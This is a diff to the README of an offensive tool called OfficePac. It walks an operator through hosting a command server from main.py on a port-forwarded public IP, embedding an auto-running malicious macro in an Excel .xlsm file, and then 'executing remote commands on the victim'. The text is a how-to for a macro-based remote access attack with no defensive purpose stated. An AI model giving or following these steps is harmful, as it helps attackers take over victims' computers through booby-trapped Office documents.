@@ -24,11 +24,12 @@ To decrypt it, paste the decrypt.txt inside a new macro, put your encrypted text
 
 1. First, you will have to install dependencies. Navigate to the OfficePac folder with your terminal and type:
 - pip install -r requirements.txt
-2. Run the main.py file to host your webserver
-3. Edit the macro to replace it with your URL instead
-4. Copy the macro to your Excel document, and save it as a .xlsm
-5. Enable editing, and then re-run it. It should automatically run the macro.
-6. You should now be able to execute remote commands on the victim
+2. Edit main.py to match your public IP address and port forward your private IP address. Don't know how to? 
+- https://www.howtogeek.com/66214/how-to-forward-ports-on-your-router/
+4. Run the main.py file to host your webserver
+5. Edit the macro to replace it with your URL instead, then copy the macro to your Excel document and save it as a .xlsm
+6. Enable editing, and then re-run it. It should automatically run the macro.
+7. You should now be able to execute remote commands on the victim
 
 # Extra 
 You can also use Python instead of Word. 
